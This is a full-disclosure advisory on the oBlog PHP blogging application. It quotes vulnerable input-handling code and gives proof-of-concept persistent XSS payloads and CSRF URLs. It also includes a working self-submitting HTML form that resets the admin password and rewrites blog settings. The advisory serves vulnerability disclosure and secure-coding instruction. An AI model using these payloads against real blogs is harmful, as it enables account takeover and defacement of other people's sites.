@@ -1,0 +1,322 @@
+[-------------------------------------------------------------------------------------------------]
+[   Application: oBlog                                                                            ]
+[   Version: the only one there is :)                                                             ]
+[   Download: http://www.dootzky.com/images/projects/oBlog.zip                                    ]
+[   Author of this full disclosure: Milos Zivanovic                                               ]
+[   Vulnerabilities: Persistant XSS, CSRF, Admin Bruteforce...                                    ]
+[-------------------------------------------------------------------------------------------------]
+
+Author of the application is contacted and author of this paper is not responsible for anything
+you do after reading this text.
+
+[#] Content:
+ |--Persistant XSS
+ |  |
+ |  |--Vulnerable function
+ |  |--XSS in article comments
+ |  |--XSS in add new article / Edit article, Naslov field (admin only)
+ |  |--XSS in add new group (category) / Edit group, Naslov field (admin only)
+ |  |--XSS in add link (blogroll) / Edit link, Ime prijatelja, Link fields (admin only)
+ |  |--XSS in settings (admin only)
+ |  |--NOTE!
+ |
+ |--Cross Site Request Forgery
+ |  |
+ |  |--Enable/Disable post
+ |  |--Enable/Disable category
+ |  |--Remove link
+ |  |--Logout admin
+ |  |--Change admin password
+ |  |--Change admin settings (name, lastname, PASSWORD, blog title, blog slogan, text about author)
+ |     |--Exploit
+ |
+ |--Admin Bruteforce
+ |
+ |--Blog Spaming with empty/junk comments
+ |
+ |--Conclusion
+
+
+[#] Full Disclosure:
+
+-[================================================================================================]
+-[+]Persistant XSS:
+-[================================================================================================]
+
+Function used in this application for filtering input against different types of attacks is not
+written good and does not escape html characters.
+
+Vulnerable code:
+
+/oBlog/php/functions.php line 66-94 (function protectInput)
+[code---------------------------------------------------------------------------------------------]
+// protect invalind input 
+function protectInput($data, $type) 
+{ 
+    if ($type == 'int') {
+        if ((!is_numeric($data)) || ($data < 0)) $data = -1;
+    }
+    elseif ($type == 'double') {
+        if ((!is_numeric($data)) || ($data < 0)) $data = -1;
+    }
+    elseif ($type == 'doubleLOOSE') {
+        if (!is_numeric($data)) $data = -1; // jer cu nekada hteti da dozvolim i negativni broj, npr: ODBICI = -50 eura
+    }
+    elseif ($type == 'str') {
+        // minimum length
+        if (strlen($data) == 0) $data = '--';
+        // add slashes if needed
+        $data = (!get_magic_quotes_gpc()) ? addslashes ($data) : $data;
+    }
+    elseif ($type == 'date') {
+        // otpakuj datum, i pripremi ga za ubacivanje u bazu (YYYY-MM-DD)
+        $tmp = explode('.', $data);
+        $data = $tmp[2] .'-'. $tmp[1] .'-'. $tmp[0];
+    }
+    else {
+        die('wrong data type?! functions.php -> protectInput();');
+    }
+    
+
+    return $data;
+}
+[code---------------------------------------------------------------------------------------------]
+
+As we can see there's no function that deals with escaping html characters thus enableing us to
+insert malicious javascript code.
+
+[-]XSS in article comments:
+
+http://localhost/oBlog/article.php?aid=[ARTICLE ID]
+When adding comment to blog post, we can insert javascript code into certain fields and it will not
+be filtered, and pure javascript code will show one the page. Vulnerable fields: Ime, Komentar
+
+/oBlog/article.php line 44-49 (function saveNewComment)
+[code---------------------------------------------------------------------------------------------]
+// get data
+    $commentName    = protectInput($_POST['commentName'], 'str');
+    $commentEmail   = protectInput($_POST['commentEmail'], 'str');
+    $commentWeb     = protectInput($_POST['commentWeb'], 'str');
+    $commentText    = protectInput($_POST['commentText'], 'str');
+[code---------------------------------------------------------------------------------------------]
+
+I've used this javascript just to test vulnerability:
+
+[POC----------------------------------------------------------------------------------------------]
+<script>alert(1)</script>
+[POC----------------------------------------------------------------------------------------------]
+
+[-]XSS in add new article / Edit article, Naslov field (admin only):
+
+Add: http://localhost/oBlog/admin/write.php?new=entry
+Edit: http://localhost/oBlog/admin/write.php?edit=[ARTICLE ID]
+When creating new post (or edit) in admin panel, person can inject malicious javascript code into
+field: Naslov and it will not be filtered, as it is using same protectInput function.
+
+/oBlog/admin/write.php line 136-138 (function saveChanges)
+[code---------------------------------------------------------------------------------------------]
+// get data
+    $article_id     = protectInput($_POST['article_id'], 'int');
+    $title          = protectInput($_POST['title'], 'str');
+[code---------------------------------------------------------------------------------------------]
+
+The title of the post is showed in main page of the blog, as in the main page of the admin panel
+so this could be used for hidden and more important dangerous permanent javascript.I've used this
+javascript just to test vulnerability:
+
+[POC----------------------------------------------------------------------------------------------]
+<script>alert(1)</script>
+[POC----------------------------------------------------------------------------------------------]
+
+[-]XSS in add new group (category) / Edit group, Naslov field (admin only):
+
+Add: http://localhost/oBlog/admin/groups.php?new=entry
+Edit: http://localhost/oBlog/admin/groups.php?edit=[ARTICLE ID]
+When creating new group or category(or editing), we can insert malicious javascript code into
+field: Ime Grupe and it will not be filtered, this script also uses protectInput function.
+
+/oBlog/admin/groups.php line 79-81 (function saveChanges)
+[code---------------------------------------------------------------------------------------------]
+// get data
+    $category_id    = protectInput($_POST['category_id'], 'int');
+    $category_name  = protectInput($_POST['category_name'], 'str');
+[code---------------------------------------------------------------------------------------------]
+
+Title of groups is showed in main page of the blog and in the Groups page in the admin panel.
+I've used this javascript just to test vulnerability:
+
+[POC----------------------------------------------------------------------------------------------]
+<script>alert(1)</script>
+[POC----------------------------------------------------------------------------------------------]
+
+[-]XSS in add link (blogroll) / Edit link, Ime prijatelja, Link fields (admin only):
+
+Add: http://localhost/oBlog/admin/blogroll.php?new=entry
+Edit: http://localhost/oBlog/admin/blogroll.php?edit=[BLOGROLL ID]
+When adding new link (or editing) we can insert malicious javascript code into fields: Ime
+Prijatelja and Link. Field Ime Prijatelja is showed in the main page of the blog and in the
+blogroll.php page of the admin panel, and field Link is exploitable only in admin panel
+(blogpoll.php).
+
+/oBlog/admin/blogroll.php line 67-69 (function saveChanges)
+[code---------------------------------------------------------------------------------------------]
+// get data
+    $blogroll_id    = protectInput($_POST['blogroll_id'], 'int');
+    $tile           = protectInput($_POST['title'], 'str');
+[code---------------------------------------------------------------------------------------------]
+
+I've used this javascript just to test vulnerability:
+
+[POC----------------------------------------------------------------------------------------------]
+<script>alert(1)</script>
+[POC----------------------------------------------------------------------------------------------]
+
+[-]XSS in settings (admin only):
+
+http://localhost/oBlog/admin/settings.php
+There we can edit fields Ime bloga and Moj slogan and put javascript which will be printed in every
+page of our blog (not admin panel) and that is certainly not good.
+
+/oBlog/admin/settings.php line 20-22
+[code---------------------------------------------------------------------------------------------]
+// settings
+    $data['blog_name']     = protectInput($_POST['blog_name'], 'str');
+    $data['tag_line']      = protectInput($_POST['tag_line'], 'str');
+[code---------------------------------------------------------------------------------------------]
+
+I've used this javascript just to test vulnerability:
+
+[POC----------------------------------------------------------------------------------------------]
+<script>alert(1)</script>
+[POC----------------------------------------------------------------------------------------------]
+
+[-]NOTE!
+
+I didn't think about this at the begining of the search for the exploits mission, but i've just
+realised that all of the 'admin only' XSS's i found can be injected via CSRF method.
+
+-[================================================================================================]
+-[+]Cross Site Request Forgery:
+-[================================================================================================]
+
+Author of this blogging system is not introduced with csrf vulnerability, so there were no tokens
+or other security mesures used to secure this application against this type of attack.
+
+[-]Enable/Disable post:
+
+We can inject this link below into some <iframe> and with admin visiting the link it will disable
+showing of certain article (depending on article id)
+
+[POC---DISABLE------------------------------------------------------------------------------------]
+http://localhost/oBlog/admin/write.php?publish=[ARTICLE ID]&action=0
+[POC----------------------------------------------------------------------------------------------]
+
+[POC---ENABLE-------------------------------------------------------------------------------------]
+http://localhost/oBlog/admin/write.php?publish=[ARTICLE ID]&action=1
+[POC----------------------------------------------------------------------------------------------]
+
+[-]Enable/Disable category:
+
+Another disable csrf. With this by opening this one admin will secretly disable showing all posts
+from certain category (depending on category id)
+
+[POC----DISABLE-----------------------------------------------------------------------------------]
+http://localhost/oBlog/admin/groups.php?visible=[CATEGORY ID]&action=0
+[POC----------------------------------------------------------------------------------------------]
+
+[POC----ENABLE------------------------------------------------------------------------------------]
+http://localhost/oBlog/admin/groups.php?visible=[CATEGORY ID]&action=1
+[POC----------------------------------------------------------------------------------------------]
+
+[-]Remove link:
+
+With this csrf we can remove any or all links from the blogging system:
+
+[POC----------------------------------------------------------------------------------------------]
+http://localhost/oBlog/admin/blogroll.php?delete=[LINK ID]
+[POC----------------------------------------------------------------------------------------------]
+
+[-]Logout admin:
+
+With this csrf we can logout admin without his knowledge:
+
+[POC----------------------------------------------------------------------------------------------]
+http://localhost/oBlog/admin/write.php?logout=user
+[POC----------------------------------------------------------------------------------------------]
+
+[*]Change admin password:
+
+This is one of the most critical vulnerabilities i found in this application. Since there is no
+CSRF protection, we can change admin's password. Here's the sweet data we need to send via POST
+method for this to work:
+
+[INFO---------------------------------------------------------------------------------------------]
+submit = 1 // set it to any value, just set it :)
+password1 = "hacked"
+password2 = "hacked"
+[INFO---------------------------------------------------------------------------------------------]
+
+And send it to /oBlog/admin/settings.php script via POST method. That will change password for the
+admin with default username 'admin' (you can't change that in admin panel or anywhere else).
+
+[*]Change admin settings (name, lastname, PASSWORD, blog title, blog slogan, text about author)
+
+[EXPLOIT------------------------------------------------------------------------------------------]
+<form action="http://localhost/oBlog/admin/settings.php" method="POST">
+  <input type="text" name="name" value="exploit">
+  <input type="text" name="surname" value="for oBlog">
+  <input type="text" name="nice_name" value="exploit for oBlog">
+  <input type="text" name="blog_name" value="Exploited blog">
+  <input type="text" name="tag_line" value="Free your mind and the ass will follow">
+  <input type="password1" name="password1" value="hacked">
+  <input type="password2" name="password2" value="hacked">
+  <select name="posts_per_page">
+    <option label="15" value="15" selected="selected">15</option>
+  </select>
+  <select name="theme">
+    <option value="pedja" selected>pedja</option>
+  </select>
+  <textarea name="about">I have been hacked</textarea>
+  <input type="submit" value="Snimi promene" name="submit" id="submitButton">
+</form>
+<script>document.forms[0].submit.click();</script>
+[EXPLOIT------------------------------------------------------------------------------------------]
+
+We can edit the fields and put the desired stuff in them. Since i've showed that some other parts
+of the oBlog blogging system are vulnerable to persistant xss, we could use this to insert hidden
+<iframe> with malicious content in the name of the blog. If you don't want to edit admin's password
+remove value="hacked" from 2 lines above you find this in.
+
+-[================================================================================================]
+-[+]Admin Bruteforce
+-[================================================================================================]
+
+On the admin panel login script /oBlog/admin/index.php there is no security mesure against
+bruteforce. A program could be made that would bruteforce the script and, depending on password
+complexity, sooner or later, find the login info. Captcha system would come in handy to fix this
+vulnerability.
+
+-[================================================================================================]
+-[+]Blog Spaming with empty/junk comments
+-[================================================================================================]
+
+When adding comments to posts there is no security mesure against bots (no captcha) and on top of
+that script doesn't test the input if it's empty, using function protectInput from functions.php
+that i posted in the begining of this text it only converts empty fields into '--'. So we can use
+one link to generate junk comments.
+
+[POC----------------------------------------------------------------------------------------------]
+http://localhost/oBlog/article.php?aid=[ARTICLE ID]&comment=new
+[POC----------------------------------------------------------------------------------------------]
+
+-[================================================================================================]
+-[+]Conclusion
+-[================================================================================================]
+
+oBlog web application is very small (less then 3 mb) and simple. Even tho it's small and simple
+it is full of security holes, and as we all know security is something that should come in first
+place and it should be our main goal to achive when coding web applications.
+
+[-------------------------------------------------------------------------------------------------]
+[                                              EOF                                                ]
+[-------------------------------------------------------------------------------------------------] 		 	   		  
